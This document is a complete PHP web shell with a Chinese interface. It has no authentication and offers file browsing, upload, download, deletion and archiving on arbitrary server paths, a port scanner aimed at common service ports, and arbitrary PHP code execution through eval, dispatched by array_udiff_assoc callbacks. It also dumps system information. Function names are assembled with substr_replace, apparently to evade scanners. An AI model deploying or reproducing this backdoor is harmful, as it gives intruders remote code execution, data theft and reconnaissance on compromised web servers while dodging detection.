<?php
header('Content-Type: text/html; charset=utf-8');
$s = isset($_GET['s']) ? $_GET['s'] : 'fm';
$a = isset($_GET['a']) ? $_GET['a'] : '';

// 端口扫描
function scanPort($ip, $port)
{
    $timeout = 2; // 设置超时时间，单位为秒

    $socket = @fsockopen($ip, $port, $errno, $errstr, $timeout);

    if ($socket) {
        return true; // 端口开放
    } else {
        return false; // 端口关闭
    }
}


// 删除目录及其内容
function deleteDirectory($path)
{
    if (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file) {
            $filePath = $path . '/' . $file;
            if (is_dir($filePath)) {
                deleteDirectory($filePath);
            } else {
                unlink($filePath);
            }
        }
        if (rmdir($path)) {
            $response = [
                'message' => '文件夹删除成功！',
                'url' => '01.php?s=fm&path=' . dirname($path)
            ];
        };
    } elseif (is_file($path)) {
        // return unlink($path);
        if (unlink($path)) {
            $response = [
                'message' => '文件删除成功！',
                'url' => '01.php?s=fm&path=' . dirname($path)
            ];
        };
    } else {
        $response = [
            'message' => '删除出错',
            'url' => '01.php?s=fm&path=' . dirname($path)
        ];
    }
    echo json_encode($response);
    exit;
}


// 文件上传
function Upfile()
{
    $uploadResults = array();

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_FILES["file"])) {
            $fileCount = count($_FILES["file"]["name"]);
            for ($i = 0; $i < $fileCount; $i++) {
                $fileName = $_FILES["file"]["name"][$i];
                $fileTmpName = $_FILES["file"]["tmp_name"][$i];
                $fileError = $_FILES["file"]["error"][$i];

                if ($fileError === UPLOAD_ERR_OK) {
                    $destination = "./" . $fileName;
                    if (move_uploaded_file($fileTmpName, $destination)) {
                        $uploadResults[] = "文件 " . $fileName . " 上传成功";
                    } else {
                        $uploadResults[] = "文件 " . $fileName . " 上传失败";
                    }
                } else {
                    $uploadResults[] = "文件 " . $fileName . " 上传出错: 错误码 " . $fileError;
                }
            }
        }
    }

    // 将上传结果传递给 JavaScript
    echo '<script>alert("' . implode("\\n", $uploadResults) . '");</script>';
}

// 获取文件信息
function Manfile($path)
{
    $a = scandir("$path");
    $files = [];


    foreach ($a as $key => $value) {
        $fileInfo = [];

        // 获取文件名
        $fileInfo['name'] = $value;

        $fileInfo['name-1'] = $value;
        // 获取文件类型
        if (is_file("$path\\$value")) {
            $fileInfo['type'] = mime_content_type("$path\\$value");
        } else {
            $fileInfo['type'] = "Directory";
            $absolutePath = realpath("$path\\$value");
            $fileInfo['name'] = '<a href="?s=fm&path=' . $absolutePath . '">' . $value . '</a>';
        }

        // 获取修改时间
        $fileInfo['mtime'] = date("Y-m-d H:i:s", filemtime("$path\\$value"));

        // 获取文件大小
        $fileInfo['size'] = filesize("$path\\$value");
        $fileInfo['size'] =  ($fileInfo['size']) / 1024;
        $fileInfo['size'] = number_format($fileInfo['size'], 2);
        $files[] = $fileInfo;
    }

    return $files;
}

// 文件下载
function downloadFile($filePath)
{
    // 检查文件是否存在
    if (file_exists($filePath)) {
        // 设置响应头，指定文件类型和文件名
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        // 读取文件并输出给浏览器
        echo readfile($filePath);
        exit;
    } else {
        echo "文件不存在";
    }
}

// 打包目录为ZIP文件
function packDirectory($sourceDir, $outputZip)
{
    $zip = new ZipArchive();
    if ($zip->open($outputZip, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
        $sourceDir = rtrim($sourceDir, '/');
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($sourceDir),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($files as $name => $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($sourceDir) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }

        $zip->close();
        return true;
    } else {
        return false;
    }
}

// 解压ZIP文件到目录
function unpackArchive($zipFile, $outputDir)
{
    $zip = new ZipArchive();
    if ($zip->open($zipFile) === true) {
        $zip->extractTo($outputDir);
        $zip->close();

        // 获取ZIP文件名（不包含扩展名）
        $zipFileName = pathinfo($zipFile, PATHINFO_FILENAME);

        // 创建同名子目录
        $subDir = $outputDir . '/' . $zipFileName;
        if (!is_dir($subDir)) {
            mkdir($subDir);
        }

        // 移动文件到子目录
        $files = scandir($outputDir);
        foreach ($files as $file) {
            $filePath = $outputDir . '/' . $file;
            if (is_file($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) !== 'zip') {
                // $r = substr_replace('renade','me',4);  // 修改函数名
                // 动态调用函数

                substr_replace('renade','me',4)($filePath, $subDir . '/' . $file);
            }
        }

        return true;
    } else {
        return false;
    }
}

// 新建文件
function CreateItem($itemName, $path)
{
    $itemPath = $path . '/' . $itemName;
    if (!file_exists($itemPath)) {
        if (strpos($itemName, '.') !== false) {
            // 创建文件
            if (touch($itemPath)) {
                $response = ['message' => '文件创建成功', 'url' => '01.php?s=fm&path=' . $path];
            } else {
                $response = ['message' => '文件创建失败', 'url' => '01.php?s=fm&path=' . $path];
            }
        } else {
            // 创建文件夹
            if (mkdir($itemPath)) {
                $response = ['message' => '文件夹创建成功！', 'url' => '01.php?s=fm&path=' . $path];
            } else {
                $response = ['message' => '文件夹创建失败！', 'url' => '01.php?s=fm&path=' . $path];
            }
        }
    } else {
        $response = ['message' => '文件或文件夹已存在！', 'url' => '01.php?s=fm&path=' . $path];
    }
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}
// 打包文件或文件夹
function zipFiles($source, $destination)
{
    // 创建 ZipArchive 对象
    $zip = new ZipArchive();

    // 打开压缩包文件，如果不存在则创建
    if ($zip->open($destination, ZipArchive::CREATE) !== true) {
        return false;
    }

    // 添加文件到压缩包
    if (is_file($source)) {
        $zip->addFile($source, basename($source));
    } elseif (is_dir($source)) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source));

        foreach ($files as $file) {
            // 排除.和..目录
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($source) + 1);

                // 添加指定文件到压缩包
                if ($relativePath == basename($source)) {
                    $zip->addFile($filePath, $relativePath);
                }
            }
        }
    }

    // 关闭压缩包
    $zip->close();

    return true;
}
// 获取id信息
function get_id()
{
    return $_SERVER['REMOTE_ADDR'] . "-" . "$_SERVER[SERVER_SOFTWARE]";
}

$id = get_id();


switch ($s) {
    case 'fm':
        $path = isset($_GET['path']) ? $_GET['path'] : getcwd(); // 获取用户输入的路径或使用当前工作目录
        // 获取文件信息
        if (isset($path)) {
            $result = Manfile($path);
        }

        switch ($a) {
            case 'up':

                // 文件上传
                if (isset($_FILES["file"])) {
                    Upfile();
                }
                break;
            case 'dl':
                // 文件删除
                $dlpath = $_POST['dlpath'];
                $filename = $_POST['filename'];
                $p = $dlpath . '\\' .  $filename;
                deleteDirectory($p);
                break;
            case 'zip':
                // 文件打包
                $fileName = isset($_POST['fileName']) ? $_POST['fileName'] : '';

                if (!empty($fileName) && !empty($path)) {
                    $fileName = preg_replace('/[^a-zA-Z0-9\-\_\.]/', '', $fileName); // 过滤文件名中的非法字符
                    $zipPath = realpath($path) . '/' . $fileName . '.zip';

                    if (zipFiles($path, $zipPath)) {
                        // 返回打包文件的下载链接
                        $downloadUrl = 'http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . '/' . $fileName . '.zip';
                        $response = [
                            'message' => '文件打包成功！',
                            'url' => $downloadUrl
                        ];
                        echo json_encode($response);
                    } else {
                        // 提示用户打包失败
                        $response = [
                            'message' => '文件打包失败！'
                        ];
                        echo json_encode($response);
                    }
                } else {
                    // 提示用户输入文件名和路径
                    $response = [
                        'message' => '请输入要打包的文件名和路径！'
                    ];
                    echo json_encode($response);
                }
                exit;
                break;
            case 'cf':
                // 文件或文件夹创建
                $itemName = $_POST['itemName'];
                $xjpath = $_POST['xjpath'];
                if (isset($itemName)) {
                    CreateItem($itemName, $xjpath);
                }

                break;
            case 'ch':
                // 重命名
                $oldFileName = $_POST["oldname"];
                $newFileName = $_POST["newname"];
                // $r = substr_replace('renade','me',4);
                // 更改文件名
                if (substr_replace('renade','me',4)($oldFileName, $newFileName)) {
                    $response = ['message' => '文件名更改成功！', 'url' => '01.php?s=fm'];
                } else {
                    $response = ['message' => '文件名更改失败！', 'url' => '01.php?s=fm'];
                }
                header('Content-Type: application/json');
                echo json_encode($response);
                exit;
                break;
            case 'co':
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    // 执行文件复制操作
                    $sourcePath = $_POST['sourcePath']; // 源文件路径
                    $destinationPath = $_POST['destinationPath']; // 目标文件路径
                    // $c = substr_replace('corr','py',2); // 修改函数名
                    if (substr_replace('corr','py',2)($sourcePath, $destinationPath)) {
                        $response = [
                            'status' => 'success',
                            'message' => '文件复制成功',
                            'url' => '01.php?s=fm&path=' . dirname($destinationPath) // 可以在复制成功后，跳转到某个页面
                        ];
                    } else {
                        $response = [
                            'status' => 'error',
                            'message' => '文件复制失败'
                        ];
                    }

                    echo json_encode($response);
                    exit;
                }
                break;
            case 'yd':
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    // 执行文件复制操作
                    $sourcePath = $_POST['sourcePath']; // 源文件路径
                    $destinationPath = $_POST['destinationPath']; // 目标文件路径
                    if ($sourcePath && $destinationPath) {
                        # code...
                    }
                    // $c = substr_replace('corr','py',2);  // 修改函数名
                    substr_replace('corr','py',2)($sourceFile, $destinationFile);  // 动态调用函数

                    // $r = substr_replace('renade','me',4);  // 修改函数名
                    // 动态调用函数

                    if (substr_replace('renade','me',4)($sourcePath, $destinationPath)) {
                        $response = [
                            'status' => 'success',
                            'message' => '文件移动成功',
                            'url' => '01.php?s=fm&path=' . dirname($destinationPath) // 可以在复制成功后，跳转到某个页面
                        ];
                    } else {
                        $response = [
                            'status' => 'error',
                            'message' => '文件移动失败'
                        ];
                    }

                    echo json_encode($response);
                    exit;
                }
                break;
            case 'df':
                $dfpath = $_POST['dfpath'];
                $dfname = $_POST['dfname'];
                if (isset($dfpath) && isset($dfname)) {
                    $filename = $dfpath . '\\' . $dfname;
                    downloadFile($filename);
                    exit;
                }
                break;
            case 'pk':
                // $sourceDir = 'D:\phpstudy_pro\WWW\localhost\demo';
                // $outputZip = 'D:\phpstudy_pro\WWW\localhost\zip\demo.zip';
                // $outputDir = 'D:\phpstudy_pro\WWW\localhost\zip';
                // 源目录路径
                $sourceDir = $_POST['sourcePath'];

                // zip文件要移动的目录
                $outputDir = $_POST['targetPath'];
                // zip文件路径
                $outputZip = $outputDir . '\\' . basename($sourceDir) . '.zip';
                if (!is_dir($outputDir)) {
                    mkdir($outputDir, 0777, true);
                }
                // 打包目录
                if (packDirectory($sourceDir, $outputZip)) {
                    $res = [
                        "message" => '目录打包成功！',
                        "url" => '01.php?s=fm&path=' . $outputDir
                    ];
                } else {
                    $res = [
                        "message" => '目录打包成功！',
                        "url" => '01.php?s=fm&path=' . $outputDir
                    ];
                }
                echo json_encode($res);
                exit;
                break;
            case 'upk':

                $sourceDir = $_POST['sourcePath']; //newzip\demo.zip
                $outputDir = $_POST['targetPath']; // dirname($sourceDir)
                // zip文件要移动的目录
                // $outputDir = dirname($sourceDir);//newzip
                // zip文件路径
                // $outputZip = $outputDir . '\\' . basename($sourceDir) . '.zip';//
                // 解压ZIP文件
                if (unpackArchive($sourceDir, $outputDir)) {
                    $res = [
                        "message" => 'ZIP文件解压成功！',
                        "url" => '01.php?s=fm&path=' . $outputDir
                    ];
                } else {
                    $res = [
                        "message" => 'ZIP文件解压失败！',
                        "url" => '01.php?s=fm&path=' . $outputDir
                    ];
                }
                echo json_encode($res);
                exit;
                break;
            default:
                # code...
                break;
        }

        break;
    case 'em':

        if (isset($_GET['cmd'])) {
            $cmd = $_GET['cmd'];
            $result = iconv("GBK", "UTF-8//IGNORE", @array_udiff_assoc($cmd, array(1), "eval"));
        } else {
            $result = "回显";
        }

        break;
    case 'sp':
        if (isset($_GET['ip'])) {
            $host = $_GET['ip'];

            // $fp=fsockopen($host,$post,$timeout=15);
            $port = array(21, 22, 23, 25, 80, 110, 111, 135, 139, 443, 445, 1433, 1521, 3306, 3389, 4899, 5432, 5631, 7001, 8000, 8080, 14147, 43958);
            $result = "";
        }

        break;
    case 'ep':
        if (isset($_GET['eval'])) {
            $eval = $_GET['eval'];
        }
        break;

    default:
        # code...
        break;
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        /* #zt {
            display: none;
        } */
        #xttext {
            font-family: "SimSun", sans-serif;
            font-size: 18px;
            font-weight: bold;
            font-style: italic;
            color: #000000;
        }

        .outtable {
            border: 1px solid #333;
            padding: 10px;
            background-color: #f2f2f2;
        }

        .content {
            margin-top: 20px;
        }

        .box1 {
            float: left;
            margin-bottom: 10px;
        }

        .box2 {
            float: left;
            margin-bottom: 10px;
        }

        .box3 {
            float: left;
            margin-bottom: 10px;
        }

        .fundiv {
            display: flex;
        }

        .table-container {
            width: 100%;
            overflow: auto;
        }

        .table-container table {
            width: 100%;
            border-collapse: collapse;
        }

        .table-container th,
        .table-container td {
            padding: 8px;
            border: 1px solid #ccc;
        }

        .table-container th {
            background-color: #f2f2f2;
            position: sticky;
            top: 0;
            z-index: 1;
        }

        .table-container tbody {
            display: block;
            overflow-y: scroll;
            height: 500px;
            /* 设置内容区域的高度 */
        }

        .table-container tr:nth-child(even) {
            background-color: #f9f9f9;
        }

        .table-container tr:hover {
            background-color: #ebebeb;
        }
    </style>
</head>

<body>
    <div class="outtable">
        <div style=" border: 2px solid #333; padding: 0.2px;background-color: #f2f2f2;">IP与服务器info: <?= $id ?></div>
        <div>
            <table>
                <tr>
                    <td>
                        <button><a href="?s=fm" id="t_0">文件管理</a></button>
                        <button><a href="?s=em" id="t_1">命令执行</a></button>
                        <button><a href="?s=sp" id="t_2">扫描端口</a></button>
                        <button><a href="?s=ep" id="t_3">php代码执行</a></button>
                        <button><a href="?s=xt" id="t_3">系统信息</a></button>
                    </td>
                </tr>
            </table>
            <!-- 文件上传 -->
            <?php if ($s === "fm") : ?>
                <div class="content">
                    <div>
                        <!-- 文件上传 -->
                        <div class="box1">
                            <form action="01.php?s=fm&a=up" method="post" enctype="multipart/form-data">
                                <label for="file"><b>上传文件:</b></label>

                                <input type="file" name="file[]" id="file" multiple>
                                <input type="submit" value="上传">

                            </form>
                        </div>
                        <div class="box2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</div>
                        <!-- 文件目录 -->
                        <div class="box3">

                            <form action="./01.php?s=fm" method="GET">

                                <b>目录查询:</b>

                                <!-- 查询表单 -->
                                <input type="text" name="path" value="<?= $path ?>" style="width: 300px;" id="path">
                                <input type="submit" value="查询">
                            </form>

                        </div>
                    </div>

                    <br>

                    <br>
                    <div class="table-container">
                        <table class="out">
                            <tr>
                                <th>文件名</th>
                                <th>文件类型</th>
                                <th>修改时间</th>
                                <th>大小</th>
                                <th>操作</th>
                            </tr>
                            <?php foreach ($result as $fileInfo) : ?>
                                <tr>
                                    <td data-oldname='<?= $fileInfo['name'] ?>'>
                                        <?php if ($fileInfo['type'] != 'Directory') : ?>
                                            <a href="" onclick="downloadFile(this)">
                                                <?= $fileInfo['name'] ?>
                                            </a>
                                        <?php else : ?>

                                            <?= $fileInfo['name'] ?>

                                        <?php endif; ?>
                                    </td>
                                    <td><?= $fileInfo['type'] ?></td>
                                    <td><?= $fileInfo['mtime'] ?></td>
                                    <td><?= $fileInfo['size'] ?> kb</kbd></td>
                                    <td>
                                        <button onclick="confirmDelete(this)">删除</button>
                                        <button onclick="changename(this)">重命名</button>
                                        <button onclick="copyfile(this)">复制</button>
                                        <!-- 打包文件或文件夹 -->

                                        <?php if ($fileInfo['type'] === "Directory" & $fileInfo['name'] !== "." && $fileInfo['name'] !== "..") : ?>
                                            <button onclick="pack(this)">打包</button>
                                        <?php endif; ?>
                                        <?php if ($fileInfo['type'] === "application/zip") : ?>
                                            <button onclick="unpack(this)">解压</button>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </table>
                    </div>
                    <div class="fundiv">
                        &nbsp;&nbsp;&nbsp;&nbsp;
                        <button onclick="createItem()">新建文件/文件夹</button>
                        &nbsp;&nbsp;&nbsp;&nbsp;
                        <button onclick="ztfile()" id="zt">粘贴</button>
                        &nbsp;&nbsp;&nbsp;&nbsp;
                        <button onclick="ydfile()" id="yd">移动</button>
                    </div>
                </div>
            <?php endif; ?>

            <!-- 命令执行 -->
            <?php if ($s === "em") : ?>
                <div class="content">

                    <form action="01.php?s=em" method="GET">
                        <input type="hidden" name="s" value="em">
                        <label>系统命令参数:</label>
                        <input type="text" name="cmd">
                        <input type="submit" value="执行">
                    </form>
                    <textarea name="show" style="width:660px;height:399px;"><?= $result ?></textarea>
                </div>
            <?php endif; ?>

            <!-- 端口扫描 -->
            <?php if ($s === "sp") : ?>
                <div class="content">

                    <form action="01.php?s=sp" method="GET">
                        <input type="hidden" name="s" value="sp">
                        扫描IP: <input type="textv" name="ip"><br>
                        扫描端口:<input type="test" value="21,22,23,25,80,110,111,135,139,443,445,1433,1521,3306,3389,4899,5432,5631,7001,8000,8080,14147,43958" style="width: 666px;"><br>
                        <input type="submit" value="扫描">
                    </form>
                    <?php if ($host == 0) {
                        die;
                    }
                    foreach ($port as $k => $v) :
                        $fp = @fsockopen($host, $v, $errno, $errstr, 0.6);
                        $result = $fp ? '<font color="#43CD80">开启端口: </font>' : '<font color="#FF6347">关闭端口: </font>';
                    ?>

                        <b><?= $result ?><?= $v ?></b><br>

                    <?php endforeach; ?>
                </div>
            <?php endif; ?>

            <!-- 代码执行 -->
            <?php if ($s === "ep") : ?>
                <div class="content">

                    <form action="01.php?s=ep" method="GET">
                        <input type="hidden" name="s" value="ep">
                        <label></label>
                        请输入PHP代码: <input type="text" name="eval">
                        <input type="submit" value="执行">
                    </form>
                    <textarea name="show" style="width:660px;height:399px;"><?php @array_udiff_assoc(array($eval), array(1), "eval"); ?></textarea>
                </div>
            <?php endif; ?>
            <!-- 获取系统信息 -->
            <?php if ($s === "xt") : ?>
                <div class="content">

                    <textarea name="" id="xttext" style="width:660px;height:500px;">
                        <?php

                        // 获取系统信息
                        $os = php_uname('s');
                        $release = php_uname('r');
                        $version = php_uname('v');
                        $machine = php_uname('m');

                        echo "您当前系统信息如下：\n\n";
                        echo "PHP版本:" . PHP_VERSION . "\n\n";

                        echo "PHP安装路径:" . DEFAULT_INCLUDE_PATH . "\n\n";

                        echo "当前文件绝对路径：" . __FILE__ . "\n\n";

                        echo "Http请求中Host值：" . $_SERVER["HTTP_HOST"] . "\n\n";

                        echo "获取服务器IP： " . $_SERVER['SERVER_NAME'] . "\n\n";

                        echo "请求的服务器IP：" .  $_SERVER["SERVER_ADDR"] . "\n\n";

                        echo "客户端IP： " . $_SERVER['REMOTE_ADDR'] . "\n\n";


                        echo "服务器系统目录： " . $_SERVER['SystemRoot'] . "\n\n";

                        echo "用户域名：" . $_SERVER['USERDOMAIN'] . "\n\n";

                        echo "服务器语言： " . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . "\n\n";

                        echo "服务器Web端口：  " . $_SERVER['SERVER_PORT'] . "\n\n";
                        // 输出系统信息
                        echo "操作系统名称: $os\n\n";
                        echo "发布版本: $release\n\n";
                        echo "内核版本: $version\n\n";
                        echo "机器类型: $machine\n\n";
                        ?>
                     </textarea>
                </div>
            <?php endif; ?>

        </div>

    </div>
    </div>
</body>
<script>
    // 文件删除提示
    function confirmDelete(file) {
        var dlpath = document.getElementById('path').value;
        var name = file.parentNode.parentNode.querySelector('[data-oldname]').getAttribute('data-oldname');
        var filename = (ina(name) === null) ? name : ina(name);
        if (filename != '' && filename != '\\') {

            var flag = confirm("确定要删除" + dlpath + "\\" + filename + "吗？");
            if (flag) {
                var params = new URLSearchParams();
                params.append('dlpath', dlpath);
                params.append('filename', filename);
                console.log(params);
                fetch("01.php?s=fm&a=dl", {
                        method: "POST",
                        body: params
                    }).then(response => response.json())
                    .then((data) => {
                        console.log(data);
                        alert(data.message);
                        if (data.url != '') {
                            window.location.href = data.url;
                        }
                    });
            }

        }

    }
    // 判断是否存在 <a> 标签并获取文本内容
    function ina(s) {
        // 创建一个临时的 div 元素
        var tempDiv = document.createElement('div');
        tempDiv.innerHTML = s;

        // 获取第一个 <a> 标签
        var anchor = tempDiv.querySelector('a');

        // 判断是否存在 <a> 标签
        if (anchor) {
            // 获取 <a> 标签中的文本内容
            var text = anchor.textContent;
            return text;
        } else {
            return null;
        }
    }
    // 新建文件
    function createItem() {
        var xjpath = document.getElementById('path').value;
        var itemName = prompt("请输入文件名：");
        if (itemName) {
            var params = new URLSearchParams();
            params.append('itemName', itemName);
            params.append('xjpath', xjpath);

            fetch("01.php?s=fm&a=cf", {
                    method: "POST",
                    body: params
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                    alert(data.message);
                    window.location.href = data.url;
                });
        }
    }
    // 文件复制
    function copyfile(button) {
        var sourcePath = document.getElementById('path').value;
        // 获取文件名
        var name = button.parentNode.parentNode.querySelector('[data-oldname]').getAttribute('data-oldname');
        console.log(name);
        document.cookie = "sourcePath=" + sourcePath;
        document.cookie = "name=" + name;
        // document.getElementById('zt').style.display = 'inline-block';
    }
    // 文件粘贴
    function ztfile() {
        var destinationPath = document.getElementById('path').value;
        document.cookie = "destinationPath=" + destinationPath;

        // 从 cookie 中获取 sourcePath 和 name
        var sourcePath = getCookieValue("sourcePath");
        if (sourcePath == '') {
            alert('原路径为空');
            return false;
        }
        var name = getCookieValue("name");
        console.log(name);

        var params = new URLSearchParams();
        params.append('sourcePath', sourcePath + "\\" + name);
        params.append('destinationPath', destinationPath + "\\" + name);

        fetch("01.php?s=fm&a=co", {
                method: "POST",
                body: params
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                alert(data.message);
                if (data.url != '') {
                    window.location.href = data.url;
                }
            });

        // 删除 cookie
        document.cookie = "destinationPath=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
        document.cookie = "sourcePath=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
    }
    // 文件移动
    function ydfile() {
        var destinationPath = document.getElementById('path').value;
        document.cookie = "destinationPath=" + destinationPath;

        // 从 cookie 中获取 sourcePath 和 name
        var sourcePath = getCookieValue("sourcePath");
        if (sourcePath == '') {
            alert('原路径为空');
            return false;
        }
        var name = getCookieValue("name");
        console.log(name);

        var params = new URLSearchParams();
        params.append('sourcePath', sourcePath + "\\" + name);
        params.append('destinationPath', destinationPath + "\\" + name);

        fetch("01.php?s=fm&a=yd", {
                method: "POST",
                body: params
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                alert(data.message);
                if (data.url != '') {
                    window.location.href = data.url;
                }
            });

        // 删除 cookie
        document.cookie = "destinationPath=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
        document.cookie = "sourcePath=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
    }
    // 获取cookie
    function getCookieValue(cookieName) {
        var cookieValue = '';
        var strCookie = document.cookie;
        var arrCookie = strCookie.split("; ");

        for (var i = 0; i < arrCookie.length; i++) {
            var arr = arrCookie[i].split("=");
            if (cookieName === arr[0]) {
                cookieValue = arr[1];
                break;
            }
        }

        return cookieValue;
    }
    // 重命名
    function changename(button) {
        var oldname = button.parentNode.parentNode.querySelector('[data-oldname]').getAttribute('data-oldname');
        var newname = prompt("请输入文件名：");
        if (newname) {
            var params = new URLSearchParams();
            params.append('newname', newname);
            params.append('oldname', oldname);

            fetch("01.php?s=fm&a=ch", {
                    method: "POST",
                    body: params
                })
                .then(response => response.json())
                .then(data => {
                    console.log(data);
                    alert(data.message);
                    if (data.url != '') {
                        window.location.href = data.url;
                    }

                });
        }
    }
    // 文件打包
    function pack(file) {
        var pkpath = document.getElementById('path').value;
        var name = file.parentNode.parentNode.querySelector('[data-oldname]').getAttribute('data-oldname');
        var pkname = (ina(name) === null) ? name : ina(name);
        // 获取源目录路径
        var sourcePath = pkpath + '\\' + pkname;
        // 获取压缩文件目标路径
        var targetPath = prompt('请输入压缩文件目标路径：(默认目录为本目录下)', 'newzip');

        if (targetPath !== '' && targetPath !== 'null') {
            var params = new URLSearchParams();
            params.append('sourcePath', sourcePath);
            params.append('targetPath', targetPath);
            // 构造请求参数

            // 发起POST请求
            fetch('01.php?s=fm&a=pk', {
                    method: 'POST',
                    body: params
                })
                .then(response => response.json())
                .then(result => {
                    alert(result.message);
                    window.location.href = result.url;
                })
                .catch(error => {
                    // 处理错误
                    console.error(error);
                });
        } else {
            alert('请输入目标路径');
        }
    }

    function unpack(file) {
        var unpkpath = document.getElementById('path').value;
        console.log(unpkpath);
        var name = file.parentNode.parentNode.querySelector('[data-oldname]').getAttribute('data-oldname');
        console.log(name);
        var unpkname = (ina(name) === null) ? name : ina(name);
        console.log(unpkname);
        // 获取源目录路径
        var sourcePath = unpkpath + '\\' + unpkname;
        console.log(sourcePath);
        // 获取压缩文件目标路径
        var targetPath = prompt('请输入解压文件的目标路径：(默认目录为本目录下)', unpkpath);

        if (unpkpath !== '' && unpkpath !== 'null') {
            var params = new URLSearchParams();
            params.append('sourcePath', sourcePath);
            params.append('targetPath', targetPath);
            // 构造请求参数

            // 发起POST请求
            fetch('01.php?s=fm&a=upk', {
                    method: 'POST',
                    body: params
                })
                .then(response => response.json())
                .then(result => {
                    alert(result.message);
                    window.location.href = result.url;
                })
                .catch(error => {
                    // 处理错误
                    console.error(error);
                });
        } else {
            alert('请输入目标路径');
        }
    }
    // 文件下载
    function downloadFile(file) {
        var dfpath = document.getElementById('path').value;
        var name = file.parentNode.parentNode.querySelector('[data-oldname]').getAttribute('data-oldname');
        var dfname = (ina(name) === null) ? name : ina(name);
        console.log(dfname);
        console.log(dfpath);
        if (dfname != '' && dfname != '\\') {

            var flag = confirm("确定要下载" + dfpath + "\\" + dfname + "吗？");
            if (flag) {
                console.log(flag);
                var params = new URLSearchParams();
                params.append('dfpath', dfpath);
                params.append('dfname', dfname);
                fetch("01.php?s=fm&a=df", {
                        method: "POST",
                        body: params
                    }).then(response => response.blob())
                    .then(blob => {
                        // console.log(blob);
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = dfname;
                        a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                    })
                    .catch(error => {
                        console.error('文件下载失败:', error);
                    })

            };
        }

    }
</script>

</html>